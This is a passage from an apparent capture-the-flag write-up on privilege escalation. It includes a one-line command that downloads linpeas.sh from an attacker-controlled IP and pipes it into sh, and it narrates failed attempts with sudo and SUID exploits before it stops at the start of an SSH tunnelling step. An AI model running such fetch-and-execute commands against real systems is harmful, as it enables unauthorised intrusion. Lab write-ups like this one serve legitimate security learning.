# Privesc

First things first I ran linpeas.sh in memory: curl http://10.18.12.227:8001/linpeas.sh | sh

  • based on the old version of sudo I thought I might find some public exploit & I did, even multiple ones. Tried pwfeedback Buffer Overflow and a Heap-Based Buffer Overflow Privilege Escalation but without success
  • we see some new active ports on 10000 and 3306, for the moment I just took a mind-note about it
  • it permits root login on ssh
  • tried to abuse SUID files on at & pkexec but failed In the end I went back to the new exposed services. But how can I see what are they serving. SSH Tunneling is here for rescue ü¶∏. We can tunnel both services through ssh to reach them from our localhost like this:
